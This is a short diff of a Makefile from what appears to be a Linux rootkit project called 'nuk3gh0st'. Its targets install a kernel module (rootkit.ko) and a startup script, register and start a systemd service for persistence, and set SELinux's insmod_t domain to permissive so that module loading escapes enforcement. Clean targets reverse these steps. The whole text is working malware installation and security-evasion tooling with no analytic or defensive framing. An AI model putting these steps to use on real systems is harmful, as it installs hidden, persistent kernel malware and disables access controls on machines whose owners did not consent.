@@ -15,16 +15,15 @@ uninstall:
 	rm /usr/lib/rootkit.ko
 startup:
 	cp nuk3gh0st.startup /usr/lib/nuk3gh0st.startup
-	semanage fcontext -a -t su_exec_t -s system_u /usr/lib/nuk3gh0st.startup
-	restorecon -vF /usr/lib/nuk3gh0st.startup
 	chmod +x /usr/lib/nuk3gh0st.startup
 	cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
+	semanage permissive -a insmod_t
 	systemctl enable nuk3gh0st.service
 	service nuk3gh0st start
 clean-startup:
 	systemctl disable nuk3gh0st.service
 	service nuk3gh0st stop
-	semanage fcontext -d /usr/lib/nuk3gh0st.startup
+	semanage permissive -d insmod_t
 	rm /usr/lib/nuk3gh0st.startup
 	rm /lib/systemd/system/nuk3gh0st.service
 clean:
